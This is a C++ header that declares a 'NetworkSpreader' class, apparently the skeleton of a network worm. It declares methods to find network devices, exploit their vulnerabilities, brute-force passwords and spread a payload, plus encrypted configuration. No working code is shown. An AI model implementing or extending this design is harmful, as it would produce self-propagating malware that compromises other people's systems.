#ifndef NETWORKSPREADER_H
#define NETWORKSPREADER_H

#include <string>
#include <vector>
#include <map>
#include <memory>

class NetworkSpreader {
public:
    NetworkSpreader();
    void configure(const std::string &configFilePath);
    void spread(const std::string &payloadPath);

private:
    std::vector<std::string> getNetworkDevices();
    void exploitNetworkVulnerabilities(const std::string &device, const std::string &payloadPath);
    void bruteForceNetworkPasswords(const std::string &device, const std::string &payloadPath);
    void logActivity(const std::string &activity);
    void loadConfig(const std::string &configFilePath);
    void encryptConfig();
    void decryptConfig();
    void handleErrors(const std::string &error);
    void cacheResults(const std::string &device, const std::string &result);
    void recoverFromErrors();

    std::string configFilePath;
    std::map<std::string, std::string> config;
};

#endif // NETWORKSPREADER_H

